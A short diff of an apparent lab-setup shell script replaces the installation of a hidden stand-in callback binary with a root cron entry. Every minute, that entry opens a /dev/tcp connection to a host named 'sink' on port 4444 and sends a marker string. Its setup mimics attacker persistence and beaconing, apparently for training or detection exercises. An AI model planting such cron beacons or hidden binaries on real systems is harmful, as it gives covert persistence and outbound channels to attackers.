@@ -4,7 +4,5 @@
 set -eu
 SI=/lab/standins
 need() { [ -e "$SI/$1" ] || { echo "$0: $SI/$1 is missing (copy the stand-ins in first)" >&2; exit 1; }; }
-need callback.sh
-install -m 755 "$SI/callback.sh" /usr/local/bin/.lab-sync
-echo '* * * * * root /usr/local/bin/.lab-sync' > /etc/cron.d/lab-update
+echo "* * * * * root /bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3'" > /etc/cron.d/lab-update
 chmod 644 /etc/cron.d/lab-update
